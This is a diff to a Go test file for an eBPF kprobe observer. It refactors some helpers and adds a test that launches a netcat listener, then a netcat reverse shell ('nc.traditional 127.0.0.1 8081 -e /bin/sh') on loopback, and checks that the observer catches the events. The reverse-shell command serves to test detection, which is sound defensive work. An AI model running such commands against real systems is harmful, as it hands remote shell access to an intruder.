@@ -100,28 +100,37 @@ func TestObjectLoad(t *testing.T) {
 	kprobe.deleteProgs()
 }
 
-func curlFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
-	var curlMsg api.MsgIPv4TcpConnectUnix
-
-	ip := net.ParseIP("127.0.0.1")
-	if ip == nil {
-		return false
-	}
-	ip = ip.To4()
-
+func cwdPath() string {
 	path, err := os.Getwd()
 	if err != nil {
-		return false
+		return ""
 	}
 	path = reader.SwapPath(path)
 	path = path[:len(path)-1]
+	return path
+}
+
+func ipToInt(ip string) uint32 {
+	ipParsed := net.ParseIP(ip)
+	if ipParsed == nil {
+		return 0
+	}
+	return binary.LittleEndian.Uint32(ipParsed.To4())
+}
+
+func localIP() uint32 {
+	return ipToInt("127.0.0.1")
+}
+
+func curlFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
+	var curlMsg api.MsgIPv4TcpConnectUnix
 
 	curlMsg.Common.Op = api.MSG_OP_IPV4_TCPCONNECTRET
-	curlMsg.Tuple.DAddr = binary.LittleEndian.Uint32(ip)
+	curlMsg.Tuple.DAddr = localIP()
 	curlMsg.Tuple.DPort = 80
 	curlMsg.Tuple.Proto = 2
 	curlMsg.Pid.Curr.Filename = "/usr/bin/curl"
-	curlMsg.Pid.Curr.Args = "127.0.0.1\x00/" + path
+	curlMsg.Pid.Curr.Args = "127.0.0.1\x00/" + cwdPath()
 	curlMsg.Pid.Parent.PID = uint32(os.Getpid())
 
 	return k.CompareStrict(msg, &curlMsg)
@@ -130,19 +139,9 @@ func curlFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
 func curlExecFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
 	var curlMsg api.MsgIPv4TcpConnectUnix
 
-	path, err := os.Getwd()
-	if err != nil {
-		return false
-	}
-	path = reader.SwapPath(path)
-	path = path[:len(path)-1]
-
 	curlMsg.Common.Op = api.MSG_OP_EXECVE
-	curlMsg.Tuple.DAddr = 0
-	curlMsg.Tuple.DPort = 0
-	curlMsg.Tuple.Proto = 0
 	curlMsg.Pid.Curr.Filename = "/usr/bin/curl"
-	curlMsg.Pid.Curr.Args = "127.0.0.1\x00/" + path
+	curlMsg.Pid.Curr.Args = "127.0.0.1\x00/" + cwdPath()
 	curlMsg.Pid.Parent.PID = uint32(os.Getpid())
 
 	return k.CompareStrict(msg, &curlMsg)
@@ -170,7 +169,7 @@ func TestConnectEvent(t *testing.T) {
 	defer cancel()
 
 	kprobe := getDefaultObserver(t, false, true)
-	kprobe.AttachFilter(MsgFilter{run: curlFilterR})
+	kprobe.AttachFilter(&MsgFilter{run: curlFilterR})
 
 	loopEvents(t, &exitWG, &execWG, kprobe, ctx)
 	execWGCurl(&execWG, &exitWG, "127.0.0.1")
@@ -183,9 +182,114 @@ func TestExecEvent(t *testing.T) {
 	defer cancel()
 
 	kprobe := getDefaultObserver(t, true, true)
-	kprobe.AttachFilter(MsgFilter{run: curlExecFilterR})
+	kprobe.AttachFilter(&MsgFilter{run: curlExecFilterR})
 
 	loopEvents(t, &exitWG, &execWG, kprobe, ctx)
 	execWGCurl(&execWG, &exitWG, "127.0.0.1")
+	testDone(t, kprobe)
+}
+
+func ncExecFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
+	var filterMsg api.MsgIPv4TcpConnectUnix
+
+	ncPath, _ := exec.LookPath("nc.traditional")
+	filterMsg.Common.Op = api.MSG_OP_EXECVE
+	filterMsg.Pid.Curr.Filename = ncPath
+	filterMsg.Pid.Curr.Args = "127.0.0.1\x008081\x00-e\x00/bin/sh\x00/" + cwdPath()
+	filterMsg.Pid.Parent.PID = uint32(os.Getpid())
+
+	return k.CompareStrict(msg, &filterMsg)
+}
+
+func ncListenR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
+	var filterMsg api.MsgIPv4TcpConnectUnix
+
+	ncPath, _ := exec.LookPath("nc.traditional")
+	filterMsg.Common.Op = api.MSG_OP_EXECVE
+	filterMsg.Common.Op = api.MSG_OP_IPV4_LISTEN
+	filterMsg.Tuple.SPort = 8081
+	filterMsg.Tuple.Proto = 2
+	filterMsg.Pid.Curr.Filename = ncPath
+	filterMsg.Pid.Curr.Args = "-nvlp\x008081\x00/" + cwdPath()
+	filterMsg.Pid.Parent.PID = uint32(os.Getpid())
+
+	return k.CompareStrict(msg, &filterMsg)
+}
+
+func ncConnectR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
+	var filterMsg api.MsgIPv4TcpConnectUnix
+
+	ncPath, _ := exec.LookPath("nc.traditional")
+	filterMsg.Common.Op = api.MSG_OP_IPV4_TCPCONNECTRET
+	filterMsg.Tuple.DPort = 8081
+	filterMsg.Tuple.DAddr = localIP()
+	filterMsg.Tuple.Proto = 2
+	filterMsg.Pid.Curr.Filename = ncPath
+	filterMsg.Pid.Curr.Args = "127.0.0.1\x008081\x00-e\x00/bin/sh\x00/" + cwdPath()
+	filterMsg.Pid.Parent.PID = uint32(os.Getpid())
+
+	return k.CompareStrict(msg, &filterMsg)
+}
+
+func ncExecCloneFilterR(msg *api.MsgIPv4TcpConnectUnix, k *ObserverKprobe) bool {
+	var filterMsg api.MsgIPv4TcpConnectUnix
+
+	filterMsg.Common.Op = api.MSG_OP_EXECVE
+	filterMsg.Pid.Curr.Filename = "/bin/sh"
+	filterMsg.Pid.Curr.Args = "/" + cwdPath()
+	filterMsg.Pid.Curr.Flags = api.EventExecve
+	filterMsg.Pid.Parent.PID = uint32(os.Getpid())
+
+	return k.CompareStrict(msg, &filterMsg)
+}
+
+func filterPassCheck(t *testing.T, f *MsgFilter, pass int) {
+	fmt.Printf("f.filterPass %d\n", f.filterPass)
+	if f.filterPass != pass {
+		t.Fail()
+	}
+}
+
+func TestExecEventClone(t *testing.T) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10000*time.Millisecond)
+	var exitWG, execWG sync.WaitGroup
+	defer cancel()
+
+	kprobe := getDefaultObserver(t, true, true)
+
+	ncExecFilter := MsgFilter{run: ncExecFilterR}
+	ncListen := MsgFilter{run: ncListenR}
+	ncConnect := MsgFilter{run: ncConnectR}
+	ncExecCloneFilter := MsgFilter{run: ncExecCloneFilterR}
+
+	/* Verify initial KprobeEvent Execve "nc.traditional 127.0.0.1 8081 -e /bin/sh" */
+	kprobe.AttachFilter(&ncExecFilter)
+	/* Verify KprobeEvent TCPConnectReturn "nc.traditional 127.0.0.1 8081 -e /bin/sh" */
+	kprobe.AttachFilter(&ncListen)
+	kprobe.AttachFilter(&ncConnect)
+	/* Verify KprobeEvent Execve '-e /bin/sh' without clone() */
+	kprobe.AttachFilter(&ncExecCloneFilter)
+
+	loopEvents(t, &exitWG, &execWG, kprobe, ctx)
+
+	execWG.Wait()
+	cmdServer := exec.Command("nc.traditional", "-nvlp", "8081")
+	cmdServer.Start()
+	time.Sleep(1000 * time.Millisecond)
+	cmdClient := exec.Command("nc.traditional", "127.0.0.1", "8081", "-e", "/bin/sh")
+	cmdClient.Start()
+	exitWG.Wait()
+
+	if cmdServer != nil {
+		cmdServer.Process.Kill()
+	}
+	if cmdClient != nil {
+		cmdClient.Process.Kill()
+	}
+
+	filterPassCheck(t, &ncExecFilter, 1)
+	filterPassCheck(t, &ncListen, 1)
+	filterPassCheck(t, &ncConnect, 1)
+	filterPassCheck(t, &ncExecCloneFilter, 1)
 	testDone(t, kprobe)
 }
